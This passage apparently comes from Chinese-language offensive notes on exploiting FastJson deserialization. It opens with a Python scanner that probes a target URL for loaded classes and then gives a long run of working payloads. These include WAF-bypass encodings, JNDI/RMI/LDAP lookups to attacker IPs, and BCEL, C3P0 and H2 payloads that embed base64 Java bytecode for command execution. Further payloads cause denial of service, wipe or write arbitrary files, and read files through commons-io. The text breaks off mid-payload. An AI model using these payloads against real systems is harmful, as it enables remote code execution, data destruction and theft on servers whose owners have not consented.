&quot;poc&quot;, &quot;jarScan.json&quot;)    # 读取jarScan.json模板（畸形JSON，直接读取文本）    with open(jar_scan_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:        poc_template = f.read()    # 读取jarList.txt    with open(jar_list_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:        lines = f.readlines()    detected_jars = []    for line in lines:        line = line.strip()        if not line or &quot;//&quot; not in line:            continue        # 按 // 划分，获取类名和依赖说明        parts = line.split(&quot;//&quot;)        clazz = parts[0].strip()        description = parts[1].strip() if len(parts) &gt; 1 else &quot;&quot;        # 替换POC模板中的$&#123;clazz&#125;        poc_data = poc_template.replace(&quot;$&#123;clazz&#125;&quot;, clazz)        try:            # 发送POST请求，使用data=发送原始数据            response = requests.post(                url,                data=poc_data,                headers=&#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;,                timeout=timeout            )            # 检查响应中是否包含 &quot;can not cast to char&quot;            if &quot;can not cast to char&quot; in response.text:                result = f&quot;\\033[92m[+] 发现依赖: &#123;description&#125; (&#123;clazz&#125;)\\033[0m&quot;                print(result)                detected_jars.append(&#123;                    &quot;class&quot;: clazz,                    &quot;description&quot;: description,                    &quot;line&quot;: line.strip()                &#125;)            else:                print(f&quot;[-] 未检测到: &#123;description&#125; (&#123;clazz&#125;)&quot;)        except requests.exceptions.Timeout:            print(f&quot;[!] 请求超时: &#123;clazz&#125;&quot;)        except requests.exceptions.RequestException as e:            print(f&quot;[!] 请求失败: &#123;clazz&#125; - &#123;e&#125;&quot;)        except Exception as e:            print(f&quot;[!] 异常: &#123;clazz&#125; - &#123;e&#125;&quot;)    return detected_jarsif __name__ == &quot;__main__&quot;:    import sys    if len(sys.argv) &lt; 2:        print(&quot;Usage: python main.py &lt;target_url&gt;&quot;)        print(&quot;Example: python main.py http://example.com/api&quot;)        sys.exit(1)    target_url = sys.argv[1]    print(f&quot;[*] 开始扫描目标: &#123;target_url&#125;&quot;)    print(&quot;=&quot; * 60)    results = jar_scanner(target_url)    print(&quot;=&quot; * 60)    print(f&quot;[*] 扫描完成，共发现 &#123;len(results)&#125; 个依赖&quot;)\n\n\n\n\ndnslog\n\n&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot; &#123;&quot;@type&quot;:&quot;java.util.Locale&quot;, &quot;val&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;&quot;@type&quot;: &quot;java.lang.String&quot;&quot;@type&quot;:&quot;java.util.Locale&quot;, &quot;language&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot; &#123;1:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;TARGET_CLASS&quot;&#125;&#125;, &quot;country&quot;:&quot;x.l56y7u6g.dnslog.pw&quot; &#125;&#125;&#125;\n\n\n我本地尝试一直不行：\n\n判断是否存在期望类https://mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww\nWAF绕过unicode和hex编码\n&#123;&quot;\\x40\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;$%7bjndi:ldap://1.1.1.1:1389/EvilObject%7d&quot;,&quot;autoCommit&quot;: true&#125;&#125;\n\n\n\n多个逗号：\n&#123;,,,,,,&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,,,,,,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;,,,,,, &quot;autoCommit&quot;:true         &#125;\n\n\n\n_和-绕过：\nFastJson在解析JSON字段的key时，会将_和-替换为空；在1.2.36之前_和-只能单独使用，在1.2.36及之后，支持_和-混合使用。\n&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&#x27;d_a_t_aSourceName&#x27;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;\n\n\n\n字符填充：\n和SQL一样，WAF会放行数据字符过大的数据包\n&#123;    &quot;@type&quot;:&quot;org.example.User&quot;,    &quot;username&quot;:&quot;1&quot;,    &quot;f&quot;:&quot;a*20000&quot;  //2万个a&#125;\n\n\n\nunicode再绕过：\n炒冷饭之FastJson \n&#123;&quot;\\u+040\\u+074\\u+079\\u+070\\u+065&quot;:&quot;java.lang.AutoCloseabl\\u+065&quot;\n\n\n\n\n\n小技巧$ref触发getterhttps://xz.aliyun.com/news/16117\n当parse和parseObject不指定类型时，可以通过$ref触发任意字段的getter\njava.util.Currency触发所有getterhttps://mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww\n大致原理是，把key设置成JSONObject，但是key又得转换成字符，所以就会调用JSONObject.toString，这个在原生反序列化里就遇到过，所以触发了getter。\n而JSONObject，java.util.Currency是MiscCodec这个反序列化类里要求这样写的（改成currencyCode也可以）：\n\n能够通过java-chains生成：\n\n&#123;    &quot;x&quot;: &#123;        &quot;@type&quot;: &quot;java.util.Currency&quot;,        &quot;val&quot;: &#123;            &quot;currency&quot;: &#123;                &quot;xx&quot;: &#123;      【payload】&#125;            &#125;        &#125;    &#125;&#125;// 例子&#123;    &quot;x&quot;: &#123;        &quot;@type&quot;: &quot;java.util.Currency&quot;,        &quot;val&quot;: &#123;            &quot;currency&quot;: &#123;                &quot;xx&quot;: &#123;    &quot;x1&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;org.h2.jdbcx.JdbcDataSource&quot;    &#125;,    &#123;        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,        &quot;c&quot;: &#123;            &quot;@type&quot;: &quot;org.h2.jdbcx.JdbcDataSource&quot;,            &quot;url&quot;: &quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS &#x27;void exec() throws java.io.IOException &#123; try &#123; byte[] b = java.util.Base64.getDecoder().decode(\\&quot;yv66vgAAADIAQAEAYG9yZy9hcGFjaGUvY29tbW9tcy9iZWFudXRpbHMvY295b3RlL3Nlci9zdGQvQnl0ZUJ1ZmZlclNlcmlhbGl6ZXIyN2Q2MDNmZDM4ZjE0YTVlOWJiYTRjYjc5Mzg2NDllZgcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBAAg8Y2xpbml0PgEABGNhbGMIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA=\\&quot;)\\\\; java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\\&quot;defineClass\\&quot;, byte[].class, int.class, int.class)\\\\; method.setAccessible(true)\\\\; Class c = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length)\\\\; c.newInstance()\\\\; &#125; catch (Exception e)&#123; &#125;&#125;&#x27;\\\\;CALL EXEC ()\\\\;&quot;        &#125;    &#125;: &#123;&#125;&#125;            &#125;        &#125;    &#125;&#125;// 这个部分可以去掉 @type，&#123;&#125;默认也是解析为JSONObject    &#123;        &quot;c&quot;: &#123;            &quot;@type&quot;: &quot;org.h2.jdbcx.JdbcDataSource&quot;,            &quot;url&quot;: &quot;&quot;        &#125;    &#125;: &#123;&#125;// 最外层也能改成JSONArray    [&#123;        &quot;c&quot;: &#123;            &quot;@type&quot;: &quot;org.h2.jdbcx.JdbcDataSource&quot;,            &quot;url&quot;: &quot;&quot;        &#125;    &#125;]: &#123;&#125;\n\n下面的payload中，部分是基于JSON.parse()写的，没考虑反序列化时存在期望类。如果反序列化点有期望类，那得套一层Currency才能触发getter。\n1.2.47绕过分析@type为java.lang.Class时，调用MiscCodec反序列化，并TypeUtils.loadClass存入缓存map。\n在checkAutoType时先从缓存map取，从而绕过。\n\n\n\n修复分析默认不缓存：\n\nJdbcRowSetImpl&#123;    &quot;x1&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;x2&quot;: &#123;        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Exploit&quot;,        &quot;autoCommit&quot;: true    &#125;&#125;\n\nBCELjdk &lt;&#x3D; 8u251\n需要dbcp依赖，一种是tomcat-dbcp，一种是commons-dbcp\nbcel字符生成：\nJavaClass javaClass = Repository.lookupClass(Evil.class);String encode = Utility.encode(javaClass.getBytes(), true);String bcel = &quot;$$BCEL$$&quot; + encode;\n\n\n\norg.apache.tomcat.dbcp.dbcp.BasicDataSource tomcat-dbcp &lt;&#x3D; 7.0.109\n&#123;    &quot;name&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;    &#125;,    &quot;x1&quot;: &#123;        &quot;name&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.Class&quot;,            &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &quot;x2&quot;: &#123;            &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;x3&quot;: &#123;                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;[bcelCode]&quot;,                &quot;$ref&quot;: &quot;$.x1.x2.x3.connection&quot;            &#125;        &#125;    &#125;&#125;\n\n\n\norg.apache.tomcat.dbcp.dbcp2.BasicDataSource tomcat-dbcp-8.0.0-RC1 &lt;&#x3D; tomcat-dbcp &lt;&#x3D; 10.1.0-M2\n&#123;    &quot;name&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;    &#125;,    &quot;x1&quot;: &#123;        &quot;name&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.Class&quot;,            &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &quot;x2&quot;: &#123;            &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;x3&quot;: &#123;                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;[bcelCode]&quot;,                &quot;$ref&quot;: &quot;$.x1.x2.x3.connection&quot;            &#125;        &#125;    &#125;&#125;\n\n\n\norg.apache.commons.dbcp.BasicDataSource commons-dbcp &lt;&#x3D; 1.4\n&#123;    &quot;name&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;org.apache.commons.dbcp.BasicDataSource&quot;    &#125;,    &quot;x1&quot;: &#123;        &quot;name&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.Class&quot;,            &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &quot;x2&quot;: &#123;            &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;x3&quot;: &#123;                &quot;@type&quot;: &quot;org.apache.commons.dbcp.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;[bcelCode]&quot;,                &quot;$ref&quot;: &quot;$.x1.x2.x3.connection&quot;            &#125;        &#125;    &#125;&#125;\n\n\n\norg.apache.commons.dbcp2.BasicDataSource commons-dbcp2 &lt;&#x3D; 2.13.0\n&#123;    &quot;name&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;org.apache.commons.dbcp2.BasicDataSource&quot;    &#125;,    &quot;x1&quot;: &#123;        &quot;name&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.Class&quot;,            &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &quot;x2&quot;: &#123;            &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;x3&quot;: &#123;                &quot;@type&quot;: &quot;org.apache.commons.dbcp2.BasicDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driverClassName&quot;: &quot;[bcelCode]&quot;,                &quot;$ref&quot;: &quot;$.x1.x2.x3.connection&quot;            &#125;        &#125;    &#125;&#125;\n\nC3P0c3p0字符转换：\n    byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:/1tmp/cc5.bin&quot;));    String hex = toHexAscii(bytes);    String payload = &quot;HexAsciiSerializedMap:&quot; + hex + &quot;;&quot;;public static String toHexAscii(byte[] bytes)&#123;    int len = bytes.length;    StringWriter sw = new StringWriter(len * 2);    for (int i = 0; i &lt; len; ++i)        addHexAscii(bytes[i], sw);    return sw.toString();&#125;static void addHexAscii(byte b, StringWriter sw)&#123;    int ub = b &amp; 0xff;    int h1 = ub / 16;    int h2 = ub % 16;    sw.write(toHexDigit(h1));    sw.write(toHexDigit(h2));&#125;private static char toHexDigit(int h)&#123;    char out;    if (h &lt;= 9) out = (char) (h + 0x30);    else out = (char) (h + 0x37);    //System.err.println(h + &quot;: &quot; + out);    return out;&#125;\n\n\n\n&#123;    &quot;x1&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;    &#125;,    &quot;x2&quot;: &#123;        &quot;@type&quot;: &quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,        &quot;userOverridesAsString&quot;: &quot;[code]&quot;    &#125;&#125;\n\n\n\nmybatismybaitis也有bcel加载效果：\n&#123;    &quot;x&quot;: &#123;        &quot;xxx&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.Class&quot;,            &quot;val&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;        &#125;,        &quot;c&quot;: &#123;            &quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;        &#125;,        &quot;www&quot;: &#123;            &quot;@type&quot;: &quot;java.lang.Class&quot;,            &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;        &#125;,        &#123;            &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,            &quot;c&quot;: &#123;                &quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;            &#125;,            &quot;c&quot;: &#123;                &quot;@type&quot;: &quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,                &quot;driverClassLoader&quot;: &#123;                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;                &#125;,                &quot;driver&quot;: &quot;【bcelCode】&quot;            &#125;        &#125;:&#123;&#125;    &#125;&#125;\n\nH2Jdbccom.h2database:h2 &lt;&#x3D; 2.2.224\n&#123;    &quot;x1&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;org.h2.jdbcx.JdbcDataSource&quot;    &#125;,    &quot;x2&quot;: &#123;        &quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,        &quot;c&quot;: &#123;            &quot;@type&quot;: &quot;org.h2.jdbcx.JdbcDataSource&quot;,            &quot;url&quot;: &quot;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS &#x27;void exec() throws java.io.IOException &#123; try &#123; byte[] b = java.util.Base64.getDecoder().decode(\\&quot;yv66vgAAADIAQAEAWm9yZy9hcGFjaGUvc2hpcm8vY295b3RlL2Rlc2VyaWFsaXphdGlvbi9pbXBsL1Byb3BlcnR5VmFsdWU0NWNjYzQ5NzBmZjI0MWYwYmYzZTBjY2U4NDY1MjU5ZQcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAARiYXNlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADc2VwAQADY21kAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACwwACQAKCgAEAA0BAAdvcy5uYW1lCAAPAQAQamF2YS9sYW5nL1N5c3RlbQcAEQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMABMAFAoAEgAVAQAQamF2YS9sYW5nL1N0cmluZwcAFwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsMABkAGgoAGAAbAQADd2luCAAdAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAB8AIAoAGAAhAQAHY21kLmV4ZQgAIwwABQAGCQACACUBAAIvYwgAJwwABwAGCQACACkBAAcvYmluL3NoCAArAQACLWMIAC0MAAgABgkAAgAvAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwAxAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwACQAzCgAyADQBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwANgA3CgAyADgBAAg8Y2xpbml0PgEABGNhbGMIADsKAAIADQEABENvZGUBAA1TdGFja01hcFRhYmxlACEAAgAEAAAAAwAJAAUABgAAAAkABwAGAAAACQAIAAYAAAACAAEACQAKAAEAPgAAAIQABAACAAAAUyq3AA4SELgAFrYAHBIetgAimQAQEiSzACYSKLMAKqcADRIsswAmEi6zACoGvQAYWQOyACZTWQSyACpTWQWyADBTTLsAMlkrtwA1tgA5V6cABEyxAAEABABOAFEADAABAD8AAAAXAAT/ACEAAQcAAgAACWUHAAz8AAAHAAQACAA6AAoAAQA+AAAAGgACAAAAAAAOEjyzADC7AAJZtwA9V7EAAAAAAAA=\\&quot;)\\\\; java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\\&quot;defineClass\\&quot;, byte[].class, int.class, int.class)\\\\; method.setAccessible(true)\\\\; Class c = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length)\\\\; c.newInstance()\\\\; &#125; catch (Exception e)&#123; &#125;&#125;&#x27;\\\\;CALL EXEC ()\\\\;&quot;        &#125;    &#125;,    &quot;x3&quot;: &#123;     &quot;$ref&quot;: &quot;$.x2.c.connection&quot;     &#125;&#125;\n\n\n\n1.2.48~1.2.67以下都需要开启autotype，所以实战能利用的可能性比较低。\n&lt;&#x3D;1.2.60commons-configuration-1.10,且autotype enable：\nParserConfig.getGlobalInstance().setAutoTypeSupport(true)&lt;dependency&gt;    &lt;groupId&gt;commons-configuration&lt;/groupId&gt;    &lt;artifactId&gt;commons-configuration&lt;/artifactId&gt;    &lt;version&gt;1.10&lt;/version&gt;&lt;/dependency&gt;&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.30.1.214:1389/msy62c&quot;&#125;\n\n&lt;&#x3D;1.2.61autotype enable：\n&lt;dependency&gt;    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;    &lt;artifactId&gt;commons-configuration2&lt;/artifactId&gt;    &lt;version&gt;2.8.0&lt;/version&gt;&lt;/dependency&gt;&#123;&quot;@type&quot;:&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;,&quot;prefix&quot;:&quot;ldap://10.30.1.214:1389/msy62c&quot;&#125;\n\n&lt;&#x3D;1.2.67条件：开启autotype,存在shiro(不限版本)即可通杀\n&lt;dependency&gt;    &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;    &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;    &lt;version&gt;1.5.2&lt;/version&gt;&lt;/dependency&gt;ParserConfig.getGlobalInstance().setAutoTypeSupport(true);&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.0.107:1389/y0drfh&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;\n\n1.2.36~1.2.62存在拒绝服务攻击，无其他条件，可变相用于黑盒版本探测\n&#123;&quot;regex&quot;:&#123;&quot;$ref&quot;:&quot;$[blue rlike &#x27;^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#x27;]&quot;&#125;,&quot;blue&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;&#125;&#123;&quot;regex&quot;:&#123;&quot;$ref&quot;:&quot;$[\\blue = /\\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]&quot;&#125;,&quot;blue&quot;:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;&#125;\n\n1.2.68绕过分析这里是通过expectClass来实现绕过，也就是找java.lang.AutoCloseable的实现类。\n设置@type且进入JavaBeanDeserializer时，会将第一个@type作为expectClass，再去检查下一个@type，从而绕过：\n\n\n\n修复分析AutoCloseable进入黑名单，不作为expectClass\n\njdk11 任意写&#x2F;文件清空任意写&#123;  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,  &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,  &quot;out&quot;: &#123;    &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,    &quot;out&quot;: &#123;      &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,      &quot;file&quot;: &quot;$&#123;file&#125;&quot;,      &quot;append&quot;: false    &#125;,    &quot;infl&quot;: &#123;      &quot;input&quot;: &#123;        &quot;array&quot;: &quot;$&#123;array&#125;&quot;,        &quot;limit&quot;: $&#123;limit&#125;      &#125;    &#125;,    &quot;bufLen&quot;: &quot;100&quot;  &#125;,  &quot;protocolVersion&quot;: 1&#125;\n\nfastjson 在类没有无参数构造函数时, 如果其他构造函数是有符号信息的话也是可以调用的。\n在标准的 Java 编译过程中（使用 javac），源代码中的变量名和参数名可能会被丢弃或混淆，变成无意义的占位符。我们经常在反编译的代码中看见arg0，var0这种变量名，就是这个原因导致的。“符号信息” 指的就是编译器把 name 和 age 这两个字符串保留在字节码的 LocalVariableTable（局部变量表） 属性中。\n可以通过如下命令来检查，如果有输出 LocalVariableTable，则证明其 class 字节码里的函数参数会有参数名信息：javap -l  | grep LocalVariableTable\n文件清空&#123;  &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,  &quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,  &quot;file&quot;:&quot;/tmp/123&quot;,  &quot;append&quot;:false&#125;&#123;  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,  &quot;@type&quot;: &quot;java.io.FileWriter&quot;,  &quot;file&quot;: &quot;/tmp/nonexist&quot;,  &quot;append&quot;: &quot;false&quot;&#125;\n\n\n\n文件复制需要aspectjtools依赖\n&#123;  &quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,  &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,  &quot;targetPath&quot;:&quot;/x/x/web/nonexist.txt&quot;,  &quot;tempPath&quot;:&quot;/etc/hosts&quot;&#125;\n\ncommons-io利用commons-io版本差异http://www.bmth666.cn/2025/12/30/Fastjson-commons-io%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/\n\n需要根据不同版本的依赖，修改对应参数名。\n当io &lt; 2.5时，根据系统的不同，可能会触发WriterOutputStream中带有decoder的构造方法，这时decoder只能设置为com.alibaba.fastjson.util.UTF8Decoder。导致没法写二进制文件。这个问题在[https://github.com/cwkiller/Java-Puzzle/tree/main/Fastjson%20Decoder](https://github.com/cwkiller/Java-Puzzle/tree/main/Fastjson Decoder)   里出现过\nio 读文件&#x2F;目录由浅蓝对blackhat上的链子进行优化。\nhttps://b1ue.cn/archives/506.html  文章里设置了具体场景，对应下面的三种payload\n读取错误时返回null，要结合原本就有回显的点利用\n&#123;  &quot;abc&quot;:&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,    &quot;delegate&quot;: &#123;&quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,      &quot;reader&quot;: &#123; &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,        &quot;url&quot;: &quot;file:///tmp/&quot;      &#125;,      &quot;charsetName&quot;: &quot;UTF-8&quot;,      &quot;bufferSize&quot;: 1024    &#125;,&quot;boms&quot;: [      &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,        &quot;charsetName&quot;: &quot;UTF-8&quot;,        &quot;bytes&quot;: [          ...        ]      &#125;    ]  &#125;,  &quot;address&quot; : &#123;&quot;$ref&quot;:&quot;$.abc.BOM&quot;&#125;&#125;\n\n\n\n\n\n报错读，正确的时候报错，错误的时候不报错。这个用的多一点。\n&#123;  &quot;abc&quot;:&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,    &quot;delegate&quot;: &#123;&quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,      &quot;reader&quot;: &#123; &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,        &quot;url&quot;: &quot;file:///tmp/test&quot;      &#125;,      &quot;charsetName&quot;: &quot;UTF-8&quot;,      &quot;bufferSize&quot;: 1024    &#125;,&quot;boms&quot;: [      &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,        &quot;charsetName&quot;: &quot;UTF-8&quot;,        &quot;bytes&quot;: [          98        ]      &#125;    ]  &#125;,  &quot;address&quot; : &#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,    &quot;charSequence&quot;:     &#123;&quot;@type&quot;: &quot;java.lang.String&quot;&#123;&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;&#125;,&quot;start&quot;: 0,&quot;end&quot;: 0&#125;&#125;\n\n\n\ndns读，错误的时候有dns请求，正确的时候没有dns请求。\n&#123;  &quot;abc&quot;:&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,    &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;,    &quot;delegate&quot;: &#123;&quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;,      &quot;reader&quot;: &#123; &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;,        &quot;url&quot;: &quot;file:///tmp/test&quot;      &#125;,      &quot;charsetName&quot;: &quot;UTF-8&quot;,      &quot;bufferSize&quot;: 1024    &#125;,&quot;boms&quot;: [      &#123;        &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;,        